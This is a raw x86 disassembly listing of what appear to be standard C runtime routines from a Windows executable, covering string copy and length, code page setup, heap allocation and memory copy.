  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
